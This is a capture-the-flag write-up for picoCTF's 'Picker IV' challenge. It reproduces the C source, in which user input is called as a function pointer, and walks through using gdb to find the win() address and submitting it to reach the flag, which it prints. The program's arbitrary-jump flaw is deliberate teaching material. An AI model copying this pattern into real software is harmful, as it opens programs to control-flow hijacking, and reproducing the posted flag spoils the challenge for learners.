### Picker IV

Author: LT 'syreal' Jones
#Medium #Binary_exploitation #picoGym 
#### Description

Can you figure out how this program works to get the flag? Connect to the program with netcat: `$ nc saturn.picoctf.net 61154` The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/528/picker-IV.c). The binary can be downloaded [here](https://artifacts.picoctf.net/c/528/picker-IV).

##### Solution:
Understanding the Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void print_segf_message(){
  printf("Segfault triggered! Exiting.\n");
  sleep(15);
  exit(SIGSEGV);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

```

1. **Signal Handler**: The `signal` function registers `print_segf_message()` to be called when a segmentation fault (SIGSEGV) occurs.
2. **Input Handling**: The program asks the user to input a hexadecimal address, reads it into the `val` variable, and then sets a function pointer `foo` to this value.
3. **Jump to User Input Address**: The function pointer `foo()` is then called, effectively jumping to the address specified by the user.

**Goal**
The goal is to execute the `win()` function by making the program jump to its address. To do this, you need to provide the correct address of `win()`.

---
Steps to Get the Flag
 1. **Determine the Address of `win()`**:
	 1. You need to find out where `win()` is located in memory. Typically, this requires:
	 2. Using a debugger like `gdb` (GNU Debugger) to determine the address.
 2. **Debugging with `gdb`**:
	- Compile the program: `gcc -Compile the program: gcc -o challenge challenge.c`
	-  Start `gdb`: `gdb ./challenge`
	- Set a breakpoint: `b main` (break at the `main()` function).
	- Run the program: `run`.
	- Use the command `p win` to print the address of `win()`.
    - This will return the address, e.g., `0x5655624a` (the address may vary).
3. **Provide the Address**:

	- Run the program outside of `gdb`: `./challenge`.
	- Enter the address you found, excluding the `0x` prefix. For example, if `win()` is at `0x5655624a`, you would input `5655624a`.

```css
┌──(kali㉿kali)-[~/Downloads/pico_ctf_lab]
└─$ gdb ./picker-IV -q
Reading symbols from ./picker-IV...
(No debugging symbols found in ./picker-IV)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010e0  putchar@plt
0x00000000004010f0  puts@plt
0x0000000000401100  fclose@plt
0x0000000000401110  printf@plt
0x0000000000401120  fgetc@plt
0x0000000000401130  signal@plt
0x0000000000401140  setvbuf@plt
0x0000000000401150  fopen@plt
0x0000000000401160  __isoc99_scanf@plt
0x0000000000401170  exit@plt
0x0000000000401180  sleep@plt
0x0000000000401190  _start
0x00000000004011c0  _dl_relocate_static_pie
0x00000000004011d0  deregister_tm_clones
0x0000000000401200  register_tm_clones
0x0000000000401240  __do_global_dtors_aux
0x0000000000401270  frame_dummy
0x0000000000401276  print_segf_message
0x000000000040129e  win   ########################## this is win function
0x0000000000401334  main
0x00000000004013d0  __libc_csu_init
0x0000000000401440  __libc_csu_fini
0x0000000000401448  _fini
(gdb) 
```

```css
(gdb) print win
$1 = {<text variable, no debug info>} 0x40129e <win>
(gdb) p win
$2 = {<text variable, no debug info>} 0x40129e <win>
(gdb) 

```

```css
(gdb) r
Starting program: /home/kali/Downloads/pico_ctf_lab/picker-IV 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter the address in hex to jump to, excluding '0x': 0x40129e
You input 0x40129e
You won!
pico
[Inferior 1 (process 4211) exited normally]
(gdb) 
```

```css
┌──(kali㉿kali)-[~/Downloads/pico_ctf_lab]
└─$ ./picker-IV
Enter the address in hex to jump to, excluding '0x': 0x40129e
You input 0x40129e
You won!
pico # this is inside flag.txt
```

now on live server
```css
┌──(kali㉿kali)-[~/Downloads/pico_ctf_lab]
└─$ nc saturn.picoctf.net 54280
Enter the address in hex to jump to, excluding '0x': 0x40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}  
```
